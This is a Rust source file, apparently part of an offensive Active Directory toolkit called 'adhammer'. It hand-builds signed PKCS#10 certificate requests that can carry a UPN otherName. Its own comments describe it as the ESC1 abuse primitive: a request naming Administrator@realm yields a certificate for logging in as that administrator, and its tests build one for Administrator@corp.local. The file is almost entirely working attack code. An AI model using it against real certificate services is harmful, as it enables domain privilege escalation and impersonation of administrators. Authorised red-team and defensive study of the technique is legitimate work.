//! PKCS#10 certificate-signing request (RFC 2986) with an optional UPN `otherName` SAN — the
//! ESC1 abuse primitive: on an enrollee-supplies-subject template the CA honors this SAN, so a
//! CSR carrying `otherName=Administrator@realm` yields a client-auth cert usable to PKINIT as
//! that user. Hand-rolled DER (signed SHA-256/RSA) so it stays on the existing `rsa` dep.

use anyhow::Result;
use rsa::pkcs8::EncodePrivateKey;
use rsa::traits::PublicKeyParts;
use rsa::{Pkcs1v15Sign, RsaPrivateKey};
use sha2::{Digest, Sha256};

// ---- minimal DER ----
fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        return vec![n as u8];
    }
    let mut b = n.to_be_bytes().to_vec();
    while b.len() > 1 && b[0] == 0 {
        b.remove(0);
    }
    let mut o = vec![0x80 | b.len() as u8];
    o.extend(b);
    o
}
fn tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![tag];
    o.extend(der_len(content.len()));
    o.extend_from_slice(content);
    o
}
fn seq(c: &[u8]) -> Vec<u8> {
    tlv(0x30, c)
}
fn set(c: &[u8]) -> Vec<u8> {
    tlv(0x31, c)
}
fn ctx(n: u8, c: &[u8]) -> Vec<u8> {
    tlv(0xA0 | n, c) // constructed context-specific [n]
}
fn oid(parts: &[u32]) -> Vec<u8> {
    let mut b = vec![(parts[0] * 40 + parts[1]) as u8];
    for &p in &parts[2..] {
        let mut stack = vec![(p & 0x7f) as u8];
        let mut v = p >> 7;
        while v > 0 {
            stack.push((v & 0x7f) as u8 | 0x80);
            v >>= 7;
        }
        stack.reverse();
        b.extend(stack);
    }
    tlv(0x06, &b)
}
fn int_bytes(mut b: Vec<u8>) -> Vec<u8> {
    if b.is_empty() {
        b.push(0);
    }
    if b[0] & 0x80 != 0 {
        b.insert(0, 0);
    }
    tlv(0x02, &b)
}
fn bit_string(c: &[u8]) -> Vec<u8> {
    let mut v = vec![0u8]; // 0 unused bits
    v.extend_from_slice(c);
    tlv(0x03, &v)
}
fn utf8(s: &str) -> Vec<u8> {
    tlv(0x0c, s.as_bytes())
}
fn null() -> Vec<u8> {
    vec![0x05, 0x00]
}

/// A generated CSR: DER bytes + the PKCS#8 PEM private key (for later PKINIT).
pub struct Csr {
    pub der: Vec<u8>,
    pub key_pem: String,
}

/// Build a PKCS#10 CSR for `subject_cn`, optionally embedding `upn` as an `otherName` SAN.
pub fn build_csr(subject_cn: &str, upn: Option<&str>) -> Result<Csr> {
    let mut rng = rand::thread_rng();
    let key = RsaPrivateKey::new(&mut rng, 2048)?;
    let pk = key.to_public_key();

    // SubjectPublicKeyInfo { rsaEncryption NULL, BIT STRING(RSAPublicKey{n,e}) }
    let rsa_pub = seq(&[
        int_bytes(pk.n().to_bytes_be()),
        int_bytes(pk.e().to_bytes_be()),
    ]
    .concat());
    let alg_rsa = seq(&[oid(&[1, 2, 840, 113549, 1, 1, 1]), null()].concat());
    let spki = seq(&[alg_rsa, bit_string(&rsa_pub)].concat());

    // Name { CN=subject_cn }
    let rdn = set(&seq(&[oid(&[2, 5, 4, 3]), utf8(subject_cn)].concat()));
    let name = seq(&rdn);

    // attributes [0] IMPLICIT SET OF Attribute — extensionRequest carrying the SAN (if any).
    let attributes = match upn {
        Some(u) => {
            // otherName: [0]{ type-id UPN-OID, value [0] EXPLICIT UTF8String }
            let other = ctx(
                0,
                &[oid(&[1, 3, 6, 1, 4, 1, 311, 20, 2, 3]), ctx(0, &utf8(u))].concat(),
            );
            let san = seq(&other); // SubjectAltName ::= SEQUENCE OF GeneralName
            let ext = seq(&[oid(&[2, 5, 29, 17]), tlv(0x04, &san)].concat()); // Extension{ extnID, OCTET STRING }
            let exts = seq(&ext); // SEQUENCE OF Extension
            let attr = seq(&[oid(&[1, 2, 840, 113549, 1, 9, 14]), set(&exts)].concat()); // extensionRequest
            ctx(0, &attr)
        }
        None => ctx(0, &[]),
    };

    // CertificationRequestInfo { version 0, subject, SPKI, attributes }
    let cri = seq(&[int_bytes(vec![0]), name, spki, attributes].concat());

    // signatureAlgorithm sha256WithRSAEncryption; signature over DER(cri).
    let sig = key.sign(Pkcs1v15Sign::new::<Sha256>(), &Sha256::digest(&cri))?;
    let sig_alg = seq(&[oid(&[1, 2, 840, 113549, 1, 1, 11]), null()].concat());
    let csr = seq(&[cri, sig_alg, bit_string(&sig)].concat());

    let key_pem = key.to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)?.to_string();
    Ok(Csr { der: csr, key_pem })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn csr_is_wellformed_der_sequence() {
        let c = build_csr("adhammer", Some("Administrator@corp.local")).unwrap();
        assert_eq!(c.der[0], 0x30); // outer SEQUENCE
        assert!(c.der.len() > 400); // 2048-bit key ⇒ sizeable
        assert!(c.key_pem.contains("BEGIN PRIVATE KEY"));
    }

    #[test]
    fn dump_csr_for_external_validation() {
        // Gated: `ADHAMMER_CSR_OUT=path cargo test -p adhammer-kerberos dump_csr` writes a CSR
        // for offline validation (openssl / python cryptography). No-op otherwise.
        if let Ok(path) = std::env::var("ADHAMMER_CSR_OUT") {
            let c = build_csr("adhammer", Some("Administrator@corp.local")).unwrap();
            std::fs::write(&path, &c.der).unwrap();
        }
    }

    #[test]
    fn oid_encoding_upn() {
        // 1.3.6.1.4.1.311.20.2.3 → 2b 06 01 04 01 82 37 14 02 03
        let o = oid(&[1, 3, 6, 1, 4, 1, 311, 20, 2, 3]);
        assert_eq!(
            &o[2..],
            &[0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03]
        );
    }
}
